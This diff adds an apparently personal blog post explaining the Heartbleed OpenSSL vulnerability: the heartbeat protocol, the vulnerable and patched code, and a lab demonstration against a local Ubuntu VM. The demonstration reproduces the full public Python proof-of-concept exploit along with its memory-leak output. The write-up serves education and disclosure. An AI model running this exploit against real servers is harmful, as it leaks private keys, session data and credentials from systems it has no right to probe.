@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Heartbleed</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="css/clean-blog.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="index.html">Home</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header class="intro-header" style="background-image: url('img/heartbleed-bg.jpg');">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading" style="color:#000 !important">
+                        <h1>Heartbleed</h1>
+                        <h2 class="subheading">A tiny invalidation can go a long way.</h2>
+                        <span class="meta">Posted on April 13, 2017</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="blog-post">
+                    <div class="row">
+                        <h2>Introduction</h2>
+                        <p>
+                            The Heartbleed vulnerability allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This information can then be used to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.</p>
+
+                        <p>
+                        <div class="col-md-9">
+                                The versions of OpenSSL vulnerable to this bug are:
+                                <ul>
+                                    <li>OpenSSL 1.0.1</li>
+                                    <li>OpenSSL 1.0.1a</li>
+                                    <li>OpenSSL 1.0.1b</li>
+                                    <li>OpenSSL 1.0.1c</li>
+                                    <li>OpenSSL 1.0.1d</li>
+                                    <li>OpenSSL 1.0.1e</li>
+                                    <li>OpenSSL 1.0.1f</li>
+                                </ul>
+                            </p>
+                        </div>
+                            
+                        <div class="col-md-3">
+                            <figure>
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/dc/Heartbleed.svg" class="img-responsive">
+                                <figcaption><a href="http://heartbleed.com/heartbleed.svg">Icon by Leena Snidate | Codenomicon</a></figcaption>
+                            </figure>
+                            
+                        </div>
+                        
+                    </div>
+                    <div class="row">
+                        <h2>The Heartbeat Extension</h2>
+
+                        <p>
+                            The Heartbeat Extension provides a new protocol for Transport Layer Security(TLS) and Datagram Transport Layer Security(DTLS) allowing the usage of keep-alive functionality without performing a renegotiation. The heartbeat extension was proposed as an extension for TLS and DTLS in February 2012 by <a href="https://tools.ietf.org/html/rfc6520">RFC 6520</a>. The heartbeat extension was added to OpenSSL on March 2012 and was introduced in version 1.0.1.
+                        </p>
+                        <p>
+                            The extension works by allowing a computer at one end of a connection to send a Heartbeat Request message, consisting of a payload, typically a text string, along with the payload's length as a 16-bit integer. The receiving computer then must send exactly the same payload back to the sender.
+                        </p>
+                    </div>
+                    <div class="row">
+                        <h2>Heartbleed Vulnerability</h2>
+                        <h3>History</h3>
+                        <p>
+                            The vulnerability was reported by Neel Mehta of Google's security team on on April 1, 2014 11:09 UTC. The bug was named by an engineer at <a href="http://www.codenomicon.com/">Codenomicon</a>, a Finnish cybersecurity company. The heartbleed logo and the the domain www.heartbleed.com was launched by the company to educate the public of the vulnerability.
+                        </p>
+                        <p>
+                            The vulnerability was the official reference of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160</a>. CVE (Common Vulnerabilities and Exposures) is the Standard for Information Security Vulnerability Names maintained by <a href="http://cve.mitre.org/">MITRE</a>. 
+                        </p>
+                        <h3>Specification and Behaviour</h3>
+                        <div class="col-md-7" style="padding-left: 0">
+                            <p>
+                                The vulnerability allows anyone who can connect to a server protected by vulnerable versions of OpenSSL to read the active memory of the server. This can be done without leaving a trace and without the use of any priviledged information or credentials. Since OpenSSL is used to provide security for sensitive data, it might have sensitive data in its memory that it was processing. This data could contain username and password combos, X.509 certificates, SSL keys, etc. 
+                            </p>
+                            <p>
+                                Heartbleed is exploited by sending a malformed heartbeat request with a small payload and large length field to the vulnerable party (usually a server) in order to elicit the victim's response, permitting attackers to read up to 64 kilobytes of the victim's memory that was likely to have been used previously by OpenSSL. 
+                            </p>
+                            <p>
+                                In simple terms, a Heartbeat Request asks a the server to "send back the 5 letter word 'APPLE'", and the server responds with 'APPLE'. On the other hand, a Heartbleed request requests the server to "send back the 500 letter word 'APPLE'". The victim would respond back with 'APPLE' and 495 characters of the victim's active memory.
+                            </p>
+                            <p>
+                                A Heartbeat request has the following stucture:
+                            </p>
+                            <pre><code>struct {
+    HeartbeatMessageType type;
+    uint16 payload_length;
+    opaque payload[HeartbeatMessage.payload_length];
+    opaque padding[padding_length];
+} HeartbeatMessage;</code></pre>
+                            <p>The payload length field is a 16-bit integer, which implies that it can hold a length of 65,535. This translates to 64KB of data that can be requested from the server. The server allocates a memory buffer for the message to be returned based on the payload length field in the requesting message, without validating if the payload length given matches the the actual size of that message's payload. Because of this failure to do proper bounds checking, the message returned consists of the payload, followed by whatever else happened to be in the allocated memory buffer.</p>
+                        </div>
+                            
+                        <div class="col-md-5">
+                            <fig>
+                                <img src="https://imgs.xkcd.com/comics/heartbleed_explanation.png" class="img-responsive">
+                                <figcaption>Photo by <a href="https://xkcd.com/1354/">xkcd: Heartbleed Explanation</a></figcaption>
+                            </fig>
+                        </div>
+                        <div class="col-md-12" style="padding-left: 0">
+                            <p>
+                                The broken <a href="">OpenSSL code</a> that processes the incoming HeartbeatMessage is shown below, where <code>p</code> is a pointer to the start of the message:
+                            </p>
+                            <pre><code>/* Read type and payload length first */
+hbtype = *p++;
+n2s(p, payload);
+pl = p;</code></pre>
+                        <p>
+                            So the message type is moved into the <code>hbtype</code> variable, the pointer is incremented by one byte, and the <code>n2s()</code> macro writes the 16-bit length of the heartbeat payload to the variable <code>payload</code> and increments the pointer by two bytes. Then <code>pl</code> becomes a pointer to the contents of the payload.
+                        </p>
+                        <p>
+                            Assume a heartbeat message with a payload_length of 65535(64KB), the maximum possible, is received. The code has to send back a copy of the incoming HeartbeatMessage, so it allocates a buffer to hold the 64KB payload plus one byte to store the message type, two bytes to store the payload length, and some padding bytes.
+                        </p>
+                        <p>
+                            It constructs the reply <b>HeartbeatMessage</b> structure with the following code, where <code>bp</code> is a pointer to the start of the reply HeartbeatMessage:
+                        </p>
+                        <pre><code>/* Enter response type, length and copy payload */
+*bp++ = TLS1_HB_RESPONSE;
+s2n(payload, bp);
+memcpy(bp, pl, payload);</code></pre>
+                        <p>
+                            So the code writes the response type to the start of the buffer, increments the buffer pointer, uses the <code>s2n()</code> macro to write the 16-bit payload length to memory and increment the buffer pointer by two bytes, and then it copies payload number of bytes from the received payload into the outgoing payload for the reply.
+                        </p>
+                        <p>
+                            The payload is controlled by the attacker. If the actual <b>HeartbeatMessage</b> sent by the attacker only has a payload of, say, one byte, and its payload_length is greater that the length of the actual payload, then the above memcpy() will read beyond the end of the received HeartbeatMessage and start reading from OpenSSL's process memory.
+                        </p>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <h2>Vulnerability Demonstration</h2>
+
+                        <p>
+                            The demo uses the following specification. We use Ubuntu 13.04 as it uses a default version of OpenSSL version 1.0.1c, which has the Heartbleed vulnerability. 
+                        </p>
+                        <p><b>Operating System:</b> Ubuntu 13.04 (Raring Ringtail)
+                        <br><b>Apache Version:</b> Apache/2.22.2
+                        <br><b>OpenSSL Version:</b> 1.0.1c May 2012</p>
+
+                        <p>After setting up the virtual machine, we have to set up a server which will be used to demonstrate vulnerability. For this, we use Apache2, an open-source HTTP server. </p>
+                        
+                        <pre><code>$ sudo apt-get install apache2</code></pre>
+                        
+                        <p>Apache is then configured to use SSL. SSL is then configured to run using the default Ubuntu certificate.</p>
+                        
+                        <pre><code>$ sudo a2enmod ssl
+$ sudo a2ensite default-ssl
+$ sudo service apache2 restart
+</code></pre>
+    
+                        <p>Now the server has been set up with the Hearbleed vulnerability. The operating system is run on a VMWare Fusion virtual machine and is assigned an IP address of 172.16.107.129. The s_client utility by OpenSSL can be used to connect to the server at port 443 to verify if the setup is right.</p>
+                        <pre><code>$ openssl s_client -connect 172.16.107.129:443 –tlsextdebug</code></pre>
+
+                        <p>This gives the back the following results:</p>
+                        <pre><code>$ openssl s_client -connect 172.16.107.129:443 -tlsextdebug
+CONNECTED(00000003)
+TLS server extension "renegotiation info" (id=65281), len=1
+0001 - <SPACES/NULS>
+TLS server extension "session ticket" (id=35), len=0
+TLS server extension "heartbeat" (id=15), len=1
+0000 - 01                                                .
+depth=0 CN = ubuntu
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = ubuntu
+verify return:1
+---
+Certificate chain
+ 0 s:/CN=ubuntu
+   i:/CN=ubuntu
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIICsjCCAZqgAwIBAgIJAPB6ojZ4tiD1MA0GCSqGSIb3DQEBBQUAMBExDzANBgNV
+BAMTBnVidW50dTAeFw0xNzA0MDYyMTUwMjdaFw0yNzA0MDQyMTUwMjdaMBExDzAN
+BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMPH
+6qs7v8/24hMISrFgMPEOOPPZNoGiQO/31IiJBv6IxOtCH3K/eVng4RGxYa0q3p8Y
+lUG0lns79uiBvbUiuaczWbb8rqz/FVSG92JHNe34x6rVtFI7vRrFmro+dUCn7P6K
+CFxKlef/nfXj7WC99rONjjyPwKc+R7FUXSObItf6FV5TMNVRNPFVsASpxW/ujwWL
+AJWgHtpPCuXpEoQdFds/vkOuzmhfT5GWE3KsVVm013bKZmmfOiRrfgiElBYsR1nI
+IGcwLlf2ZRxwTjiWbvolg0ElPzNdbd/SoXoHfL5il5vjTC4abOR/szLZhndnCvMS
+vuy5ScDuZsmoB+RZlC8CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQUF
+AAOCAQEAdVIIIjO8dxsBUKEEp5aTDFZTwdysvOFxdHD3ii+LM5h30BOfUIwTvCDh
+AMVQuup6d6PI38ffFhwMNNtIOAfuMbJHwH9jHfdWeqhXwRaLT8Qo0AXN/bzJWXAI
+rdUsZa3NDIvGp9OQDjJB/o7O9KVJxWOMVmIfbZiOj/Fpim96eIPmR518foRKooMz
+bClGZocRf4lRedAoVM56zjusqQO5htgY9kwk13BeTI59JafruSQAviKy1r/1aLOY
+oCCHDCNQnCVJd6CWVIWcH23hthJ6DngvTSsBC5myPJdytgmzjNd1gcgUUrkL1PdB
+vbWD8PduGJyQjlnsILhOV91d8WQEXw==
+-----END CERTIFICATE-----
+subject=/CN=ubuntu
+issuer=/CN=ubuntu
+---
+No client certificate CA names sent
+Peer signing digest: SHA512
+Server Temp Key: DH, 1024 bits
+---
+SSL handshake has read 1571 bytes and written 498 bytes
+---
+New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-GCM-SHA384
+Server public key is 2048 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : DHE-RSA-AES256-GCM-SHA384
+    Session-ID: D6B472FEA6636329B3B572A06E5555E98D3915E3ADF00B6BEAE33FD1D4916758
+    Session-ID-ctx: 
+    Master-Key: BE34F39316B9BE3EEB4EB6BD97D892D483338AE5F1C901CC128EC3F43F56730634BA82935E411933C50677B2B818DCCE
+    Key-Arg   : None
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - 97 77 24 01 df 79 09 c4-fc 4d c6 31 42 e3 8c d8   .w$..y...M.1B...
+    0010 - 3e d5 91 cf 87 61 93 70-f1 59 d7 14 93 43 e1 41   >....a.p.Y...C.A
+    0020 - 78 42 c6 b4 b6 76 e2 4f-23 a3 6b a0 12 c5 1f b1   xB...v.O#.k.....
+    0030 - 01 b1 19 4d 08 06 90 b9-5b 89 7a 74 90 b6 c9 1a   ...M....[.zt....
+    0040 - 45 5b b9 4e 98 9b 08 d0-c1 24 13 ed 34 fc 82 ee   E[.N.....$..4...
+    0050 - ec 1a cb a6 bf 7c e5 30-12 89 4d db 53 3d db 97   .....|.0..M.S=..
+    0060 - 05 38 01 a1 c4 ea 0c 26-bc 43 60 38 c5 c7 c9 57   .8.....&.C`8...W
+    0070 - 61 af 35 19 41 e4 05 06-54 a6 f0 4c 1f c2 60 5e   a.5.A...T..L..`^
+    0080 - 95 95 cb bc f6 86 4c 7b-af be 5c 62 17 97 d3 3f   ......L{..\b...?
+    0090 - 46 03 af 65 a9 58 19 b4-5f 95 f5 35 63 2f 94 f5   F..e.X.._..5c/..
+    00a0 - 7d e5 57 7a a5 d1 a3 db-18 12 77 4f 06 fb 78 5a   }.Wz......wO..xZ
+    00b0 - 8b 70 4f 14 90 15 6b 2c-55 68 9e fe d6 e4 c3 36   .pO...k,Uh.....6
+
+    Start Time: 1491698701
+    Timeout   : 300 (sec)
+    Verify return code: 18 (self signed certificate)
+---
+</code></pre>
+
+                        <p>The line that identifies the vulnerability is </p>
+                        <pre><code>TLS server extension "heartbeat" (id=15), len=1</code></pre>
+
+                        <p>A server that is not vulnerable to Heartbleed would not return the above line as a part of its response.Now, the Python script that exploits this vulnerabilty is executed, which is used to capture memory from the server.</p>
+
+                        <pre><code>$ python heartbleed.py 172.16.107.129 443
+Connecting...
+Sending Client Hello...
+Waiting for Server Hello...
+ ... received message: type = 22, ver = 0302, length = 58
+ ... received message: type = 22, ver = 0302, length = 704
+ ... received message: type = 22, ver = 0302, length = 525
+ ... received message: type = 22, ver = 0302, length = 4
+Sending heartbeat request...
+ ... received message: type = 24, ver = 0302, length = 16384
+Received heartbeat response:
+  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 00 00 00 00  ....#...........
+  00e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  00f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  ...
+  3f70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3f90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3fa0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+WARNING: server returned more data than it should - server is vulnerable!</code></pre>
+                        <p>The exploit code is the proof-of-concept code provided by Exploit-DB[<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160</a>].</p>
+                        <pre><code>#!/usr/bin/python
+ 
+# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# The author disclaims copyright to this source code.
+ 
+import sys
+import struct
+import socket
+import time
+import select
+import re
+from optparse import OptionParser
+ 
+options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
+options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+ 
+def h2bin(x):
+    return x.replace(' ', '').replace('\n', '').decode('hex')
+ 
+hello = h2bin('''
+16 03 02 00  dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01                                  
+''')
+ 
+hb = h2bin(''' 
+18 03 02 00 03
+01 40 00
+''')
+ 
+def hexdump(s):
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        hxdat = ' '.join('%02X' % ord(c) for c in lin)
+        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        print '  %04x: %-48s %s' % (b, hxdat, pdat)
+    print
+ 
+def recvall(s, length, timeout=5):
+    endtime = time.time() + timeout
+    rdata = ''
+    remain = length
+    while remain > 0:
+        rtime = endtime - time.time() 
+        if rtime < 0:
+            return None
+        r, w, e = select.select([s], [], [], 5)
+        if s in r:
+            data = s.recv(remain)
+            # EOF?
+            if not data:
+                return None
+            rdata += data
+            remain -= len(data)
+    return rdata
+         
+ 
+def recvmsg(s):
+    hdr = recvall(s, 5)
+    if hdr is None:
+        print 'Unexpected EOF receiving record header - server closed connection'
+        return None, None, None
+    typ, ver, ln = struct.unpack('>BHH', hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+        print 'Unexpected EOF receiving record payload - server closed connection'
+        return None, None, None
+    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    return typ, ver, pay
+ 
+def hit_hb(s):
+    s.send(hb)
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print 'No heartbeat response received, server likely not vulnerable'
+            return False
+ 
+        if typ == 24:
+            print 'Received heartbeat response:'
+            hexdump(pay)
+            if len(pay) > 3:
+                print 'WARNING: server returned more data than it should - server is vulnerable!'
+            else:
+                print 'Server processed malformed heartbeat, but did not return any extra data.'
+            return True
+ 
+        if typ == 21:
+            print 'Received alert:'
+            hexdump(pay)
+            print 'Server returned error, likely not vulnerable'
+            return False
+ 
+def main():
+    opts, args = options.parse_args()
+    if len(args) < 1:
+        options.print_help()
+        return
+ 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print 'Connecting...'
+    sys.stdout.flush()
+    s.connect((args[0], opts.port))
+    print 'Sending Client Hello...'
+    sys.stdout.flush()
+    s.send(hello)
+    print 'Waiting for Server Hello...'
+    sys.stdout.flush()
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ == None:
+            print 'Server closed connection without sending Server Hello.'
+            return
+        # Look for server hello done message.
+        if typ == 22 and ord(pay[0]) == 0x0E:
+            break
+ 
+    print 'Sending heartbeat request...'
+    sys.stdout.flush()
+    s.send(hb)
+    hit_hb(s)
+ 
+if __name__ == '__main__':
+    main()</code></pre>
+                    </div>
+                    <div class="row">
+                        <h2>Bugfixes and Deployment</h2>
+                        <p>
+                            Bodo Moeller and Adam Langley of Google prepared the fix for Heartbleed. Stephen N. Henson applied the fix to OpenSSL's version control system on 7 April 2014. The first fixed version, 1.0.1g, was released on the same day.
+                            The patch in OpenSSL 1.0.1g is essentially a bounds check, using the correct record length in the SSL3 structure <code>(s3->rrec)</code> that described the incoming <b>HeartbeatMessage</b>. If an invalid payload length is received with a Heartbeat request, the packet is quietly discared.
+                        </p>
+                        <pre><code>hbtype = *p++;
+n2s(p, payload);
+if (1 + 2 + payload + 16 > s->s3->rrec.length)
+    return 0; /* silently discard per RFC 6520 sec. 4 */
+pl = p;
+</code></pre>
+                    </div>
+                    <div class="row">
+                        <h2>References</h2>
+                        <p>
+                            <ol>
+                                <li><a href="https://tools.ietf.org/html/rfc6520">RFC6520</a></li>
+                                <li><a href="http://heartbleed.com/">Heartbleed</a></li>
+                                <li><a href="https://plus.google.com/+MarkJCox/posts/TmCbp3BhJma">Google's Timeline for the Bug</a></li>
+                                <li><a href="https://github.com/openssl/openssl">OpenSSL</a></li>
+                            </ol>
+                        </p>
+                    </div>
+                </div><!-- /.blog-main -->
+
+            </div>
+        </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://twitter.com/arunjkuruvilla/">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.linkedin.com/in/arun-john-kuruvilla/">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://github.com/arunjohnkuruvilla">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Copyright &copy; arunjohnkuruvilla 2016</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Contact Form JavaScript -->
+    <script src="js/jqBootstrapValidation.js"></script>
+    <script src="js/contact_me.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
